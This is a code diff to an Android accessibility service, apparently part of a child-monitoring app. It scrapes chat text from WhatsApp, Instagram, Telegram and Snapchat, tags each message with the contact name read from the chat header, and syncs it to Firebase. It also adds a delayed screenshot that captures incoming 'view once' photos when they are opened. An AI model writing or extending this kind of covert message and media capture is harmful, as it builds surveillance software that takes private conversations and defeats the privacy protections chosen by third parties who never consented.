@@ -62,7 +62,10 @@ class VyraAccessibilityService : AccessibilityService() {
                     packageName.contains("snapchat") -> "Snapchat"
                     else -> "Social"
                 }
-                scrapeSocialChatNodes(appName, rootInActiveWindow)
+                val activeContact = extractActiveChatContact(packageName, rootInActiveWindow)
+                if (activeContact.isNotBlank()) {
+                    scrapeSocialChatNodes(appName, activeContact, rootInActiveWindow)
+                }
             }
         }
 
@@ -147,18 +150,75 @@ class VyraAccessibilityService : AccessibilityService() {
 
     private val processedChatHashes = mutableSetOf<Int>()
 
-    private fun scrapeSocialChatNodes(appName: String, node: AccessibilityNodeInfo?) {
+    private fun extractActiveChatContact(packageName: String, root: AccessibilityNodeInfo?): String {
+        if (root == null) return ""
+        try {
+            val candidateIds = listOf(
+                "com.whatsapp:id/conversation_contact_name",
+                "com.whatsapp:id/action_bar_title",
+                "com.whatsapp:id/title",
+                "com.instagram.android:id/action_bar_title",
+                "com.instagram.android:id/thread_title",
+                "org.telegram.messenger:id/action_bar_title"
+            )
+            for (id in candidateIds) {
+                val nodes = root.findAccessibilityNodeInfosByViewId(id)
+                for (node in nodes) {
+                    val text = node.text?.toString()?.trim() ?: ""
+                    if (text.isNotBlank() && !isNavKeyword(text)) {
+                        return text
+                    }
+                }
+            }
+
+            // Fallback: search in toolbar / action bar container
+            for (i in 0 until root.childCount) {
+                val child = root.getChild(i) ?: continue
+                val resName = child.viewIdResourceName?.lowercase() ?: ""
+                if (resName.contains("toolbar") || resName.contains("action_bar") || resName.contains("header")) {
+                    val found = findFirstContactNameInHeader(child)
+                    if (found.isNotBlank()) return found
+                }
+            }
+        } catch (_: Exception) {}
+        return ""
+    }
+
+    private fun findFirstContactNameInHeader(node: AccessibilityNodeInfo?): String {
+        if (node == null) return ""
+        val text = node.text?.toString()?.trim() ?: ""
+        if (text.isNotBlank() && text.length > 1 && !isNavKeyword(text)) {
+            return text
+        }
+        for (i in 0 until node.childCount) {
+            val res = findFirstContactNameInHeader(node.getChild(i))
+            if (res.isNotBlank()) return res
+        }
+        return ""
+    }
+
+    private fun isNavKeyword(text: String): Boolean {
+        val lower = text.lowercase()
+        return lower in setOf(
+            "chats", "status", "calls", "updates", "communities", "settings",
+            "search", "search...", "camera", "more options", "new chat",
+            "messages", "direct", "stories", "spotlight", "home", "reels",
+            "online", "typing...", "last seen"
+        ) || lower.startsWith("typing...") || lower.startsWith("last seen")
+    }
+
+    private fun scrapeSocialChatNodes(appName: String, activeContact: String, node: AccessibilityNodeInfo?) {
         if (node == null) return
         val text = node.text?.toString()?.trim() ?: ""
         if (text.isNotBlank() && text.length > 1) {
             val lower = text.lowercase()
-            val isNav = lower in setOf("search", "home", "reels", "profile", "explore", "back", "camera", "message...", "send", "chats", "status", "calls", "settings") ||
+            val isNav = isNavKeyword(text) || lower in setOf("message...", "send", "seen", "delivered", "read") ||
                     lower.startsWith("seen") || lower.startsWith("typing...") || lower.startsWith("online")
-            if (!isNav) {
+            if (!isNav && !text.equals(activeContact, ignoreCase = true)) {
                 // Key deduplication on a 2-minute rolling time window (120,000 ms)
                 // This prevents spam within the same screen scrape, but allows the same words (Ok, Haa, Yes) sent later
                 val timeBucket = System.currentTimeMillis() / 120000
-                val hash = "$appName:$text:$timeBucket".hashCode()
+                val hash = "$appName:$activeContact:$text:$timeBucket".hashCode()
                 if (!processedChatHashes.contains(hash)) {
                     if (processedChatHashes.size > 1000) processedChatHashes.clear()
                     processedChatHashes.add(hash)
@@ -168,7 +228,7 @@ class VyraAccessibilityService : AccessibilityService() {
                     firebaseSync.syncChatMessage(
                         msgId = msgId,
                         app = appName,
-                        sender = "$appName Contact",
+                        sender = activeContact,
                         text = text,
                         isDeletedBySender = false,
                         isWatchlistTarget = false
@@ -177,7 +237,7 @@ class VyraAccessibilityService : AccessibilityService() {
             }
         }
         for (i in 0 until node.childCount) {
-            scrapeSocialChatNodes(appName, node.getChild(i))
+            scrapeSocialChatNodes(appName, activeContact, node.getChild(i))
         }
     }
 
@@ -300,13 +360,27 @@ class VyraAccessibilityService : AccessibilityService() {
                 contentDesc.contains("send") || text.contains("send") || viewId.contains("send_button") ||
                 contentDesc.contains("view once") || text.contains("view once") || contentDesc.contains("1 view")
 
+        val isIncomingViewOnceClick = contentDesc.contains("view once") || text.contains("view once") ||
+                contentDesc.contains("1 photo") || text.contains("1 photo") ||
+                viewId.contains("view_once") || contentDesc.contains("view photo") ||
+                text.contains("view photo") || contentDesc.contains("photo, view once") ||
+                (contentDesc.contains("opened") && contentDesc.contains("photo"))
+
         val now = System.currentTimeMillis()
-        // Debounce snapshots to at most once every 2 seconds
-        if ((isShutterClick || isOutgoingSendClick) && (now - lastSnapshotTime > 2000)) {
+        // Debounce snapshots to at most once every 1.5 seconds
+        if ((isShutterClick || isOutgoingSendClick || isIncomingViewOnceClick) && (now - lastSnapshotTime > 1500)) {
             lastSnapshotTime = now
-            val actionType = if (isOutgoingSendClick) "Outgoing 1-View Media Send" else "Camera Shutter"
-            Log.i(AppConstants.TAG, "Child $actionType triggered in $packageName (viewId: $viewId)")
-            captureScreenSnapshot(packageName, isOutgoing = isOutgoingSendClick)
+            if (isIncomingViewOnceClick) {
+                Log.i(AppConstants.TAG, "Child opened Incoming 1-View Media in $packageName (viewId: $viewId). Scheduling delayed compositor capture.")
+                executor.execute {
+                    try { Thread.sleep(350) } catch (_: Exception) {}
+                    captureScreenSnapshot(packageName, isOutgoing = false)
+                }
+            } else {
+                val actionType = if (isOutgoingSendClick) "Outgoing 1-View Media Send" else "Camera Shutter"
+                Log.i(AppConstants.TAG, "Child $actionType triggered in $packageName (viewId: $viewId)")
+                captureScreenSnapshot(packageName, isOutgoing = isOutgoingSendClick)
+            }
         }
     }
 
